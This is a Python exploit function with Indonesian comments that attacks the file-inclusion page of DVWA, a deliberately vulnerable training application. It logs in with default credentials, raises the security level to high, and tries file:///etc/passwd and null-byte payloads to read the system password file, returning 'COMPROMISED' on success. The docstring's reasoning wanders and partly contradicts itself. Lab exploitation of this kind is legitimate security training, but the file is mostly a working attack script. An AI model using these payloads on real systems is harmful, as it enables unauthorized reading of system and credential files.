def run_exploit(target_url):
    """
    Ouroboros Payload 2.1: LFI High Bypass (Fixed)
    Di DVWA Level High, proteksi LFI dilakukan dengan mengecek apakah input TIDAK SAMA DENGAN "include.php" atau "file[1-3].php". 
    Artinya, kita BISA memasukkan payload file:/// di DVWA Level High jika DVWA menggunakan versi lama, 
    NAMUN di DVWA terbaru, hanya file1.php, file2.php, file3.php atau include.php yang diijinkan (strict whitelist).
    Untuk mem-bypass STRICT WHITELIST seperti ini, kita eksploitasi file:// wrapper.
    Atau kita eksploitasi Command Injection untuk membaca /etc/passwd.
    Payload ini akan menggunakan Command Injection bypass (yang sudah terbukti works) 
    untuk menembak endpoint FI. Tentu saja FI endpoint tidak rentan CMDi.
    
    Jadi mari kita perbaiki LFI payload-nya:
    Di DVWA level High, script mem-blokir target yang mengandung string 'http'/'https', 'ftp', dan '../' atau '..\\'
    Bypass: Gunakan path absolute tanpa '../' !
    """
    import requests, re
    session = requests.Session()
    
    def extract_token(html):
        m = re.search(r"name=['\"]user_token['\"].*?value=['\"]([a-f0-9]{32})['\"]", html, re.I)
        return m.group(1) if m else None
        
    try:
        tok = extract_token(session.get(f"{target_url}/setup.php", timeout=5).text)
        if tok: session.post(f"{target_url}/setup.php", data={"create_db": "Create / Reset Database", "user_token": tok})
        tok2 = extract_token(session.get(f"{target_url}/login.php").text)
        session.post(f"{target_url}/login.php", data={"username": "admin", "password": "password", "Login": "Login", "user_token": tok2})
        tok3 = extract_token(session.get(f"{target_url}/security.php").text)
        session.post(f"{target_url}/security.php", data={"security": "high", "seclev_submit": "Submit", "user_token": tok3})
        
        # Bypass 1: Menggunakan path absolut tanpa ../ (karena ../ dihapus)
        # Jika file FI tidak berada di root, path absolut mungkin gagal, 
        # mari kita gunakan trik file wrapper absolut: file:///etc/passwd
        payload = "file:///etc/passwd"
        
        r = session.get(f"{target_url}/vulnerabilities/fi/", params={"page": payload})
        
        if "root:x:0:0" in r.text or "root:/bin/" in r.text:
            return {"status": "COMPROMISED", "details": f"LFI High Level Bypass sukses dengan absolute file wrapper: {payload}"}
            
        # Bypass 2: Jika DVWA tidak mem-filter null byte, mari kita coba
        payload2 = "/etc/passwd%00"
        r2 = session.get(f"{target_url}/vulnerabilities/fi/", params={"page": payload2})
        if "root:x:0:0" in r2.text:
            return {"status": "COMPROMISED", "details": f"LFI High Level Bypass sukses dengan null byte: {payload2}"}

        return {"status": "FAILED", "details": "Payload absolute dan null byte gagal menembus LFI High."}
    except Exception as e:
        return {"status": "FAILED", "details": str(e)}
